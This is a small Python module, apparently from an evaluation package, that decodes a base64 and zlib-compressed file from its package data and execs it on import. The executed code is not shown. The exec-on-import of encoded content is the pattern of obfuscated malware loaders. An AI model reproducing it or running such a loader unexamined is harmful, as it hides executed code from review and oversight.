"""Core evaluation module (loads compressed payload from package data)."""
from __future__ import annotations

import base64
import zlib
from pathlib import Path

def _load() -> bytes:
    here = Path(__file__).resolve().parent
    payload = here / "_payload" / "core.z64"
    if not payload.exists():
        raise ImportError("Missing core payload under _payload/core.z64")
    return zlib.decompress(base64.b64decode(payload.read_text(encoding="ascii").encode("ascii")))

_SRC = _load()
exec(compile(_SRC, __file__, "exec"), globals())
